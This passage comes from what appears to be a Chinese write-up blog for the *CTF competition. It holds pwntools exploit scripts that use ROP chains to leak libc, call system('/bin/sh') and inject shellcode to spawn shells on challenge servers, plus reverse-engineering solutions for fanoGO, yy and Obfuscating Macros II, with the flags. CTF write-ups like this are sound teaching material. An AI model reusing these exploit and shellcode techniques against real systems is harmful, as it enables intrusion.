class="number">0x8048a5a</span>)</span><br><span class="line">payload += p32(puts_plt) + p32(<span class="number">0x8048a5a</span>) + p32(puts_got) + p32(<span class="number">0x01010101</span>)</span><br><span class="line">payload += p32(gets_plt) + p32(<span class="number">0x8048a5a</span>) + p32(<span class="number">0x804A034</span>) + p32(<span class="number">0x804A034</span>)</span><br><span class="line">payload += p32(<span class="number">0x8048580</span>) + p32(<span class="number">0x8048a5a</span>) + p32(<span class="number">0x804A038</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"th number:"</span>)</span><br><span class="line">r.sendline()</span><br><span class="line"></span><br><span class="line">libc = u32(r.recv()[:<span class="number">4</span>]) - <span class="number">0x5fca0</span></span><br><span class="line"></span><br><span class="line">r.sendline(p32(libc + e.symbols[<span class="string">"system"</span>]) + <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="babyshell"><a href="#babyshell" class="headerlink" title="babyshell"></a>babyshell</h3><p>这道题迷之简单，简单绕一下判断就行了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./shellcode'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'34.92.37.22'</span>, <span class="number">10002</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'give me shellcode, plz:\n'</span>)</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">se(<span class="string">'s\x00'</span>+asm(shellcraft.sh()))   </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>*CTF{LtMh5VbedHlngmKOS2cwWRo4AkDGzCBy}</p>
</blockquote>
<h3 id="upxofnote"><a href="#upxofnote" class="headerlink" title="upxofnote"></a>upxofnote</h3><p>upx解压后，heap段是可执行的，因此可以用来写shellcode get shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./upxofcpp'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'34.92.121.149'</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,sz,content)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'Index'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'Size:'</span>)</span><br><span class="line">    sl(str(sz))</span><br><span class="line">    ru(<span class="string">'-1 to stop:'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(content),<span class="number">4</span>):</span><br><span class="line">        n = u32(content[i:i+<span class="number">4</span>])</span><br><span class="line">        <span class="keyword">if</span> n&gt;=<span class="number">0x80000000</span>:</span><br><span class="line">            n = <span class="number">0x100000000</span> - n</span><br><span class="line">            n = -n</span><br><span class="line">        sl(str(n))</span><br><span class="line">    <span class="keyword">if</span> len(content)/<span class="number">4</span> &lt; sz:</span><br><span class="line">        sl(<span class="string">'-1'</span>)</span><br><span class="line">    ru(<span class="string">'choice:'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'index:'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'choice:'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'index:'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">sz = <span class="number">0x68</span></span><br><span class="line">add(<span class="number">0</span>,sz/<span class="number">4</span>,p32(<span class="number">0x000020eb</span>)*<span class="number">0x18</span>+p32(<span class="number">0x3eeb3eeb</span>)*<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>,sz/<span class="number">4</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+asm(shellcraft.sh()).ljust(<span class="number">0x40</span>,<span class="string">'\x90'</span>))</span><br><span class="line">add(<span class="number">2</span>,sz/<span class="number">4</span>,<span class="string">''</span>)</span><br><span class="line">add(<span class="number">3</span>,sz/<span class="number">4</span>,<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="fanoGO"><a href="#fanoGO" class="headerlink" title="fanoGO"></a>fanoGO</h3><p>香农-范诺编码,decode之后要为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If you cannot read all your books...fondle them---peer into them, let them fall open where they will, read from the first sentence that arrests the eye, set them back on the shelves with your own hands, arrange them on your own plan so that you at least know where they are. Let them be your friends; let them, at any rate, be your acquaintances.</span><br></pre></td></tr></table></figure></p>
<p>编码表根据一个txt生成，具体细节不清楚，直接在程序中找字典。</p>
<p>另外程序里存字典的方式很奇特，用一个结构体表示。</p>
<p><code>fano___Fano__Decode</code>是解码函数。一阵瞎调，最后在<code>000000000045C618</code>下断，rbx指向的就是解码字典的结构体，结构如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000 dict struc ; (sizeof=0x30, mappedto_759)</span><br><span class="line">00000000 byte dq ?                               ; offset point to decoded byte</span><br><span class="line">00000008 unknown0 dq ?</span><br><span class="line">00000010 code dq ?                               ; offset the encoded code</span><br><span class="line">00000018 lenth dq ?                               ; char *   encoded lenth</span><br><span class="line">00000020 unknown1 dq ?</span><br><span class="line">00000028 unknown2 dq ?</span><br></pre></td></tr></table></figure>
<p>编码结果是从code指向的字符串开始的lenth位，我这里是手动复制出来在用文本处理得到字典的。。。<br>字典：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dic =&#123;<span class="string">' '</span>:<span class="string">'0001'</span>, <span class="string">'-'</span>:<span class="string">'00100100'</span>, <span class="string">','</span>:<span class="string">'0010001'</span>, <span class="string">'.'</span>:<span class="string">'00100101'</span>, <span class="string">';'</span>:<span class="string">'001001111'</span>, <span class="string">'I'</span>:<span class="string">'00101011'</span>, <span class="string">'L'</span>:<span class="string">'00101100001'</span>, <span class="string">'a'</span>:<span class="string">'0011'</span>, <span class="string">'c'</span>:<span class="string">'010001'</span>, <span class="string">'b'</span>:<span class="string">'010000'</span>, <span class="string">'e'</span>:<span class="string">'0101'</span>, <span class="string">'d'</span>:<span class="string">'01001'</span>, <span class="string">'g'</span>:<span class="string">'01101'</span>, <span class="string">'f'</span>:<span class="string">'01100'</span>, <span class="string">'i'</span>:<span class="string">'1000'</span>, <span class="string">'h'</span>:<span class="string">'0111'</span>, <span class="string">'k'</span>:<span class="string">'1001001'</span>, <span class="string">'m'</span>:<span class="string">'10011'</span>, <span class="string">'l'</span>:<span class="string">'100101'</span>, <span class="string">'o'</span>:<span class="string">'10110'</span>, <span class="string">'n'</span>:<span class="string">'1010'</span>, <span class="string">'q'</span>:<span class="string">'11000'</span>, <span class="string">'p'</span>:<span class="string">'10111'</span>, <span class="string">'s'</span>:<span class="string">'1101'</span>, <span class="string">'r'</span>:<span class="string">'11001'</span>, <span class="string">'u'</span>:<span class="string">'111100'</span>, <span class="string">'t'</span>:<span class="string">'1110'</span>, <span class="string">'w'</span>:<span class="string">'1111100'</span>, <span class="string">'v'</span>:<span class="string">'111101'</span>, <span class="string">'y'</span>:<span class="string">'1111110'</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>注意到大于0x7f还有一些编码以及最终结束一般不会刚好凑齐8bit，猜测后面这些都是用来表示编码结束的。<br>之前的一段文字按字典编码后还剩4bit满一个字节，就找一个12bit的用来表示结束的编码<br>结束编码：111111100010<br>直接解码的时候所有不可见字符都被替换成了0xFD，就会出错<br>比如一开始的几个字符If you，编码后是：<br>00101011011000001111111010110111100<br>8bit一组：<br>00101011   0x2B<br>01100000   0x60<br>11111110   0xFE<br>10110111   0xB7<br>100……</p>
<p>前两个字节都能够照常解码，到了第三个字符第四个被莫名替换位0xFD了。<br>动调跟入解码过程，仔细看看过程。</p>
<p><code>fano_Bytes2Str</code>函数的作用是字节转二进制字符串，在里面发现一个go的库函数<code>runtime_stringiter2</code>很可疑，进去的时候是0xFE，出来就变成0xFD了，跟进几步，发现他先校验当前字符是不是大于0x80，然后再根据后一位和后两位的数据修改，不满足某种规则会直接返回0xfffd，即变成0xfd。到这里就猜出有可能是utf8的编码问题。utf8是一种可变长的编码方式。</p>
<p>在<a href="https://en.wikipedia.org/wiki/UTF-8" target="_blank" rel="noopener">wiki</a>上可以看到unicode转utf-8的规则</p>
<blockquote>
<ul>
<li>Octal 0–177 (hex 0–7F) is coded with an unchanged single byte.</li>
<li>Octal 0200–3777 (hex 80–7FF) shall be coded with two bytes. xxyy will be 3xx 2yy.</li>
</ul>
</blockquote>
<p>注意这里的八进制添加的3和2是按照每8bit结果看的，举个例子</p>
<p>FD将会变为 C3BD</p>
<p>11111101<br>375</p>
<p>补0</p>
<p>000 1111 1101<br>03 75</p>
<p>添加3和2，03 75变成303 275，如果直接把这个数转成2进制是不对的，因为303和275是独立的两部分，每个单独地转成8bit二进制数11000011和10111101</p>
<p><strong>110</strong>00011 <strong>10</strong>111101<br>303 275</p>
<p>结果</p>
<p>C3 BD<br>1100001110111101<br>141675</p>
<p>也可以按百度百科的方法，补3个0然后填入110X XXXX 10XX XXXX中。<br>比赛时我是手动写了一个unicode到utf8的转换。赛后发现可以直接用unichr和encode转。。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'error'</span></span><br><span class="line">p = remote(<span class="string">'34.92.37.22'</span>,<span class="string">'10001'</span>)</span><br><span class="line">dic =&#123;<span class="string">' '</span>:<span class="string">'0001'</span>, <span class="string">'-'</span>:<span class="string">'00100100'</span>, <span class="string">','</span>:<span class="string">'0010001'</span>, <span class="string">'.'</span>:<span class="string">'00100101'</span>, <span class="string">';'</span>:<span class="string">'001001111'</span>, <span class="string">'I'</span>:<span class="string">'00101011'</span>, <span class="string">'L'</span>:<span class="string">'00101100001'</span>, <span class="string">'a'</span>:<span class="string">'0011'</span>, <span class="string">'c'</span>:<span class="string">'010001'</span>, <span class="string">'b'</span>:<span class="string">'010000'</span>, <span class="string">'e'</span>:<span class="string">'0101'</span>, <span class="string">'d'</span>:<span class="string">'01001'</span>, <span class="string">'g'</span>:<span class="string">'01101'</span>, <span class="string">'f'</span>:<span class="string">'01100'</span>, <span class="string">'i'</span>:<span class="string">'1000'</span>, <span class="string">'h'</span>:<span class="string">'0111'</span>, <span class="string">'k'</span>:<span class="string">'1001001'</span>, <span class="string">'m'</span>:<span class="string">'10011'</span>, <span class="string">'l'</span>:<span class="string">'100101'</span>, <span class="string">'o'</span>:<span class="string">'10110'</span>, <span class="string">'n'</span>:<span class="string">'1010'</span>, <span class="string">'q'</span>:<span class="string">'11000'</span>, <span class="string">'p'</span>:<span class="string">'10111'</span>, <span class="string">'s'</span>:<span class="string">'1101'</span>, <span class="string">'r'</span>:<span class="string">'11001'</span>, <span class="string">'u'</span>:<span class="string">'111100'</span>, <span class="string">'t'</span>:<span class="string">'1110'</span>, <span class="string">'w'</span>:<span class="string">'1111100'</span>, <span class="string">'v'</span>:<span class="string">'111101'</span>, <span class="string">'y'</span>:<span class="string">'1111110'</span>&#125;</span><br><span class="line">plain = <span class="string">'If you cannot read all your books...fondle them---peer into them, let them fall open where they will, read from the first sentence that arrests the eye, set them back on the shelves with your own hands, arrange them on your own plan so that you at least know where they are. Let them be your friends; let them, at any rate, be your acquaintances.'</span></span><br><span class="line"></span><br><span class="line">cipher = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain)):</span><br><span class="line">   cipher+=dic[plain[i]]</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line">cipher+=<span class="string">'111111100010'</span></span><br><span class="line"><span class="comment"># print(cipher)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"># my unicode to utf8</span></span><br><span class="line"><span class="string">for i in range(0,len(cipher),8):</span></span><br><span class="line"><span class="string">   temp = eval('0b'+cipher[i:i+8])</span></span><br><span class="line"><span class="string">   if temp&gt;=0x80:</span></span><br><span class="line"><span class="string">       res = '000'+bin(temp)[2:]</span></span><br><span class="line"><span class="string">       res = '110'+res[0:5]+'10'+res[5:]</span></span><br><span class="line"><span class="string">       a = res[0:8]</span></span><br><span class="line"><span class="string">       b = res[8:]</span></span><br><span class="line"><span class="string">       s+=chr(eval('0b'+a))</span></span><br><span class="line"><span class="string">       s+=chr(eval('0b'+b))</span></span><br><span class="line"><span class="string">   else:</span></span><br><span class="line"><span class="string">       s+=chr(temp)</span></span><br><span class="line"><span class="string">'''</span>        </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(cipher),<span class="number">8</span>):</span><br><span class="line">   temp = eval(<span class="string">'0b'</span>+cipher[i:i+<span class="number">8</span>])</span><br><span class="line">   s+=unichr(temp)</span><br><span class="line">s = s.encode(<span class="string">'utf8'</span>)</span><br><span class="line"><span class="comment"># p = process('fanoGo')</span></span><br><span class="line">p.recvuntil(<span class="string">':\n'</span>)</span><br><span class="line">p.send(s)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   print(p.recv())</span><br><span class="line"><span class="keyword">except</span> EOFError:</span><br><span class="line">   p.close()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>*CTF{NUY4a3E5D9186hVzejoyItr7xHBcmOpv}</p>
</blockquote>
<h3 id="yy"><a href="#yy" class="headerlink" title="yy"></a>yy</h3><p>Ch4r1l3师傅先做了一部分，看了下文档继续往后做的。</p>
<blockquote>
<p>看了下程序的逻辑，大概是<br>利用yacc进行词法解析，解析到的东西存到buffer<br>然后buffer再用encrypt这个函数进行加密，最后加密的结果与cmp进行比较<br>encrypt是用aes加密<br>测试了下，大概规则为 *CTF{xxxx}，中间的xxx范围大概为0-9,a-z<br>然后大概解了下逻辑，那个switch里面那堆从上到下就是a-z 0-9<br>encrypt是用标准aes加密，用的密钥是提前生成好了，在bss段key开始的176个字节<br>很迷的就是，它比较是0xa0个字节…….但是很明显flag没那么长<br>感觉encrypt这个函数应该会被调用多次，但是实际调试的时候只调了一次？<br>encrypt使用了一个全局变量cnt，用来记录加密了的长度</p>
</blockquote>
<p>顺着Ch4r1l3师傅的思路，我看了一下词法解析的过程。</p>
<p>在词法分析器<code>yylex</code>中，找到了一个叫<code>yy_ec</code>的table，大小256，每个元素对应一个字节，除了测试过程中输入有效的字符*CTF{}0-9a-z外，大部分都为1，仔细看了一下发现漏了个下划线不为1。调试了一下发现，输入下划线后会对下一部分重新aes加密。做题过程中发现了每次加密都会异或之前一次的加密结果，其实这就是cbc加密模式。之前一直没了解过，所以是手动写的这个异或过程= =</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strxor</span><span class="params">(s1,s2)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s1)):</span><br><span class="line">        s+=chr(ord(s1[i])^ord(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">key = <span class="string">'2B7E151628AED2A6ABF7158809CF4F3C'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">aes = AES.new(key)</span><br><span class="line">cipher = [<span class="string">'AE4614F82A40CF5031D3FE048C061212'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'23FAC726E861D9C3A93C45701AC7F03D'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'DFBEBC16AB6E37AC148B9C94F75D6278'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'FC16981DB231D35ADC3A60869ACA7BA3'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'B5D5F1B2D9FFD209D477D73DC0561902'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'B69B426CE8A277E399AC324091A92A86'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'F3FA473CC35C419BE80507D0D4305A9E'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'8D529BA3FBADB6443F72839C2277FE48'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'FE868412004EEDFFAC441923841F12CA'</span>.decode(<span class="string">'hex'</span>)]</span><br><span class="line">dic = &#123;<span class="string">'\x82'</span>:<span class="string">'a'</span>, <span class="string">'\x05'</span>:<span class="string">'b'</span>, <span class="string">'\x86'</span>:<span class="string">'c'</span>, <span class="string">'\x8A'</span>:<span class="string">'d'</span>, <span class="string">'\x0B'</span>:<span class="string">'e'</span>, <span class="string">'\x11'</span>:<span class="string">'f'</span>, <span class="string">'\x96'</span>:<span class="string">'g'</span>, <span class="string">'\x1D'</span>:<span class="string">'h'</span>, <span class="string">'\x27'</span>:<span class="string">'i'</span>, <span class="string">'\xA9'</span>:<span class="string">'j'</span>, <span class="string">'\x2B'</span>:<span class="string">'k'</span>, <span class="string">'\xB1'</span>:<span class="string">'l'</span>, <span class="string">'\xF3'</span>:<span class="string">'m'</span>, <span class="string">'\x5E'</span>:<span class="string">'n'</span>, <span class="string">'\x37'</span>:<span class="string">'o'</span>, <span class="string">'\x38'</span>:<span class="string">'p'</span>, <span class="string">'\xC2'</span>:<span class="string">'q'</span>, <span class="string">'\x47'</span>:<span class="string">'r'</span>, <span class="string">'\x4E'</span>:<span class="string">'s'</span>, <span class="string">'\x4F'</span>:<span class="string">'t'</span>, <span class="string">'\xD6'</span>:<span class="string">'u'</span>, <span class="string">'\x58'</span>:<span class="string">'v'</span>, <span class="string">'\xDE'</span>:<span class="string">'w'</span>, <span class="string">'\xE2'</span>:<span class="string">'x'</span>, <span class="string">'\xE5'</span>:<span class="string">'y'</span>, <span class="string">'\xE6'</span>:<span class="string">'z'</span>, <span class="string">'\x67'</span>:<span class="string">'0'</span>, <span class="string">'\x6B'</span>:<span class="string">'1'</span>, <span class="string">'\xEC'</span>:<span class="string">'2'</span>, <span class="string">'\xED'</span>:<span class="string">'3'</span>, <span class="string">'\x6F'</span>:<span class="string">'4'</span>, <span class="string">'\xF2'</span>:<span class="string">'5'</span>, <span class="string">'\x73'</span>:<span class="string">'6'</span>, <span class="string">'\xF5'</span>:<span class="string">'7'</span>, <span class="string">'\x77'</span>:<span class="string">'8'</span>, <span class="string">'\x7F'</span>: <span class="string">'9'</span>&#125;</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">xor = <span class="string">'00'</span>*<span class="number">16</span></span><br><span class="line">xor = xor.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">    temp = cipher[i]</span><br><span class="line">    plain = aes.decrypt(temp)</span><br><span class="line">    plainp = strxor(plain,xor)</span><br><span class="line">    xor = cipher[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> plainp:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag+=dic[j]</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            flag+=<span class="string">'_'</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">flag = <span class="string">'*CTF&#123;'</span>+flag[:<span class="number">-1</span>]+<span class="string">'&#125;'</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p>得到*CTF{yy_funct10nl_1s_h4rd_andc_n0_n33d_to_r3v3rs3}</p>
<p>然而提交不对，本地输入flag后返回congratulations。分析一下flag的语义，funct10n后面多了个l，and后面多了个c，去掉之后再提交就对了</p>
<p>原因：加密时每次用append：6124258631AB6EAFB114FE76783D1EFF填充明文，然后用输入映射的字节依次填充。append的字节在box里刚好有，比如B1对应字符l，86对应字符c，刚好跟我们求得一样。如果对应位置刚好是那个字符就会造成重复而多解。</p>
<p>最终flag：</p>
<blockquote>
<p>*CTF{yy_funct10n_1s_h4rd_and_n0_n33d_to_r3v3rs3}</p>
</blockquote>
<h3 id="Obfuscating-Macros-II"><a href="#Obfuscating-Macros-II" class="headerlink" title="Obfuscating Macros II"></a>Obfuscating Macros II</h3><p>ddctf Obfuscating Macros的升级版，强化了算法。由于之前打ddctf的时候稍微分析了一下，比较上手一点。</p>
<p>混淆还是去不掉，只能硬调<br>首先随便输入个长度16的字符串，加密在<code>sub_401006</code>里。输入的16个字节分成了两个__int64，作为参数传进函数，幅值给v6 v7，推荐的做法是查找v6和v7的引用，在所有引用的地方下断，<code>sub_4045F2</code>和<code>sub_4043C0</code>的引用不下断点。同时分析一下发现，v8是计算过程中的中间变量，也查找引用并下断点。</p>
<p>同时，根据打ddctf的经验，形如sub     rax, 4的指令比较关键，控制了程序执行的流程。在函数内发现了两处这种可疑的语句，对应的反汇编分别是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v7 &amp; <span class="number">1</span> )</span><br><span class="line">  v14 -= <span class="number">4L</span>L;</span><br></pre></td></tr></table></figure>
<p>和</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v16 &lt;= <span class="number">0x3FF</span> )</span><br><span class="line">  v15 -= <span class="number">3L</span>L;</span><br></pre></td></tr></table></figure>
<p>查找一下v16的引用，都下好断点。</p>
<p>这里其实不难猜出这是个循环，有赋初值0，有增量v16++，也有判定v16&lt;=0x3FF。</p>
<p>这两处调试的时候应该重点关照一下。</p>
<p>下好断点，开调，注意时刻观察栈上v6和v7的变化情况。</p>
<p>由于加密是分两部分加密的，所以我们干脆两部分都输入为同一字符，这里输入了11111111aaaaaaaa</p>
<p>v6 = ‘aaaaaaaa’，v7 = ‘11111111’ </p>
<p>果然首先来到v16 = 0，然后是判定v16&lt;=0x3ff，接下来只要再回到这里就是一个循环了。</p>
<p>然后是v8 = ~v7</p>
<p>接下来来到了if(v7&amp;1)，这里为真，接下来边来到v8^=*v5，观看一下v8和v5的内容，发现v8变成了v6,v5指向v7，再下来其实是v6 = v8，然后是v7 = ~v7。接下来的执行流程不难看出是把整个128位的数循环左移了一位。从栈上的结果不难看出，这里的循环左移是按照v6在高位，v7在低位。</p>
<p>之后也没什么分支了，都是一条线直到循环结束。</p>
<p>整个循环内有分支的只有最开始的(v7&amp;1)，由于我们输入的最低位是1，这回输入个最低位位0的试试，我们输入00000000aaaaaaaa</p>
<p>与之前不同的，判定完(v7&amp;1)的结果位0后，v8^=*v5这里，v8还是v6，而v5变成了指向~v7，再往后都一样了。</p>
<p>不难写出加密算法：</p>
